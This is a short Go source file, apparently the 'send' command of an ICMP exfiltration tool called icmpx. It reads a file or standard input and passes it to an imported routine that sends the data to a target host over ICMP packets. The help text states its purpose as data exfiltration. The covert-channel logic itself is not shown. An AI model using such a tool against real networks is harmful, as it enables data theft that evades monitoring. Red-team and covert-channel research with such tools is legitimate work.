package send

import (
	"log"
	"os"

	"github.com/loresuso/icmpx/pkg/exfil"
	"github.com/spf13/cobra"
)

func New() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "send [target] [file]",
		Short: "Send file via ICMP exfiltration",
		Long:  "Send a file to the target host using ICMP packets for data exfiltration",
		Args:  cobra.MinimumNArgs(1),
		Run:   run,
	}

	// Add flags here

	return cmd
}

func run(cmd *cobra.Command, args []string) {
	target := args[0]
	var file *os.File
	var err error

	if len(args) > 1 {
		file, err = os.Open(args[1])
		if err != nil {
			log.Fatalf("Error opening file: %v", err)
		}
		defer file.Close()
	} else {
		file = os.Stdin
	}

	err = exfil.NewICMP().Exfiltrate(file, target)
	if err != nil {
		log.Fatalf("Error exfiltrating: %v", err)
	}
}
